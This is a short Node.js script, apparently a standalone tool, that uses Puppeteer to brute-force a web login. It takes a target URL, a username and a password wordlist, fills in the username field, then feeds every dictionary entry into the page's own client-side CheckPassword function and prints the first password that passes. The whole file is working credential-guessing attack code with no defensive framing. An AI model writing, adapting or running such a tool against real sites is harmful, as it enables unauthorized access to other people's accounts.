//Dependencies
const Puppeteer = require("puppeteer")
const Fs = require("fs")

//Variables
const Self_Args = process.argv.slice(2)

//Main
if(!Self_Args.length){
    console.log("node index.js <url> <username> <dictionary>")
    process.exit()
}

if(!Self_Args[1]){
    console.log("Invalid username.")
    process.exit()
}

if(!Fs.existsSync(Self_Args[2])){
    console.log("Invalid dictionary.")
    process.exit()
}

const dictionary_data = Fs.readFileSync(Self_Args[2], "utf8").replace(/\r/g, "").split("\n")

if(!dictionary_data.length){
    console.log("dictionary data is empty.")
    process.exit()
}

void async function Main(){
    const browser = await Puppeteer.launch({ headless: false, args: [ "--no-sandbox", "--disable-setuid-sandbox" ] })
    const page = await browser.newPage()

    await page.goto(Self_Args[0], { waitUntil: "domcontentloaded" })
    await page.type("#txt_Username", Self_Args[1])
    var passwords = JSON.stringify(dictionary_data)

    eval(`
    void async function Self(){
        const result = await page.evaluate(()=>{
            var passwords = ${passwords}
    
            for( i in passwords ){
                result = CheckPassword(passwords[i])
            
                if(result == 1){
                    return passwords[i]
                }
            }
    
            return false
        })

        Final(result)
    }()
    `)

    async function Final(result){
        if(result){
            console.log(`Valid password ${result}`)
        }else{
            console.log("No valid password found.")
        }

        await browser.close()
        process.exit()
    }
}()